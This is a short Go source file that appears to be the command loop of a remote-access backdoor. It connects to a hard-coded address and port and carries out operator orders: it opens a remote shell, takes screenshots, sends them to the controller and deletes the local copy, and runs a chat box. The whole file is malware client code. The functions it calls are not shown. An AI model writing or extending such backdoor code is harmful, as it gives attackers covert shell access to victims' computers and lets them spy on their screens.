package main

import (
	"fmt"
	"time"
)

func main() {

	var socket Client
	var client *Client = &socket
	for { //Outer circle
		client.connect("192.168.23.1", 1234)
		for { //Inner circle
			order, _ := client.receiveData()
			if order == "shell" {
				fmt.Println()
				client.sendData("Starting shell....." + RESV_ACCOMPLISH)
				shell(client)
				continue

			} else if order == "exit" {
				fmt.Println()
				client.close()
				return //直接结束运行

			} else if order == "restart" {
				fmt.Println()
				client.close()
				time.Sleep(1000)
				break //里面break，进入外层

			} else if order == "chatbox" {
				fmt.Println()
				processChatBox(client)
				continue

			} else if order == "screenshot" {
				fmt.Println()
				filename := screenshoted()
				client.sendPic(filename)
				deleteFile(filename)
				continue

			} else {
				fmt.Println()
				continue
			}
			time.Sleep(1000)
		}
	}
}
